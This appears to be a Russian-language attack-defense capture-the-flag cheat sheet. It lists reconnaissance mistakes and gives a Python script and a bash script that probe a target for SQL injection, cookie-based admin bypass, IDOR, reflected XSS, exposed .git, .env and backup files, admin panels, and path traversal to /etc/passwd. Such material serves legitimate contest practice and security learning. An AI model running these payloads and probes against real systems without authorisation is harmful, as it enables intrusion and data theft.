Частые ошибки при поиске данных
Сканируете не ту подсеть → уточните у организаторов ДО старта!
Сканируете себя → исключите свой IP из цикла: [ "$TARGET" == "$MY_IP" ] && continue
Слишком агрессивное сканирование → nmap -T4 может забанить вас; используйте -T2 или --max-retries 1
Игнорируете свой сервис → он ваш главный источник информации об уязвимостях!
Не логируете разведку → сохраняйте всё в файлы: | tee recon_log.txt

#!/usr/bin/env python3
import requests, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
s = requests.Session()

print(f"[*] Testing {TARGET}")

# 1. SQLi в search
print("\n[1] Testing SQL Injection...")
sqli_payloads = [
    "' OR '1'='1",
    "' UNION SELECT NULL,NULL --",
    "' OR (SELECT COUNT(*) FROM users) > 0 --"
]
for payload in sqli_payloads:
    try:
        r = s.get(f"{TARGET}/search", params={"tsearch": payload}, timeout=3)
        if r.status_code == 200 and ("error" not in r.text.lower() or len(r.text) > 1000):
            print(f"  [+] Possible SQLi: {payload}")
            print(f"      Response: {r.text[:200]}")
    except: pass

# 2. Cookie manipulation
print("\n[2] Testing Cookie Manipulation...")
for rid in [0, 1, 2, 999, -1]:
    try:
        r = s.get(f"{TARGET}/admin", cookies={"rid": str(rid)}, timeout=3)
        if r.status_code == 200 and "admin" in r.text.lower():
            print(f"  [+] Admin access with rid={rid}")
    except: pass

# 3. IDOR
print("\n[3] Testing IDOR...")
for uid in range(1, 10):
    try:
        r = s.get(f"{TARGET}/task/{uid}", cookies={"rid": "1"}, timeout=3)
        if r.status_code == 200 and "private" in r.text.lower():
            print(f"  [+] Access to private task uid={uid}")
    except: pass

# 4. XSS
print("\n[4] Testing XSS...")
xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
for payload in xss_payloads:
    r = s.get(f"{TARGET}/search", params={"tsearch": payload}, timeout=3)
    if payload in r.text:
        print(f"  [+] Possible XSS: {payload} reflected")

print("\n[*] Testing complete")

```bash
#!/bin/bash
# save as quick_scan.sh
TARGET=${1:-"127.0.0.1"}

echo "[*] Quick scan of $TARGET"

# 1. Стандартные пути к флагам
echo -e "\n[1] Checking flag paths..."
for path in "/flag" "/flags" "/api/flag" "/admin/flag" "/.env" "/config.py" "/backup.sql"; do
    result=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$path" 2>/dev/null)
    if [ "$result" == "200" ]; then
        echo "  [+] FOUND: http://$TARGET$path"
        curl -s "http://$TARGET$path" | head -5
    fi
done

# 2. .git утечка
echo -e "\n[2] Checking .git exposure..."
if curl -s "http://$TARGET/.git/HEAD" | grep -q "ref:"; then
    echo "  [+] .git directory exposed!"
    echo "  Run: git clone http://$TARGET/.git"
fi

# 3. Админки
echo -e "\n[3] Checking admin panels..."
for admin in "/admin" "/administrator" "/wp-admin" "/phpmyadmin" "/manager"; do
    result=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$admin" 2>/dev/null)
    if [ "$result" == "200" ] || [ "$result" == "302" ]; then
        echo "  [+] Found: http://$TARGET$admin (HTTP $result)"
    fi
done

# 4. Path Traversal
echo -e "\n[4] Testing Path Traversal..."
for param in "file" "path" "page" "template"; do
    result=$(curl -s "http://$TARGET/download?$param=../../etc/passwd" 2>/dev/null)
    if echo "$result" | grep -q "root:x:"; then
        echo "  [+] Path Traversal found via parameter: $param"
    fi
done

# 5. SQLi (базовый тест)
echo -e "\n[5] Testing SQL Injection..."
for param in "id" "user" "search" "q"; do
    normal=$(curl -s "http://$TARGET/search?$param=test" 2>/dev/null | wc -c)
    sqli=$(curl -s "http://$TARGET/search?$param=' OR '1'='1" 2>/dev/null | wc -c)
    if [ "$normal" != "$sqli" ] && [ "$sqli" -gt 100 ]; then
        echo "  [+] Possible SQLi via parameter: $param"
    fi
done

echo -e "\n[*] Scan complete"
```
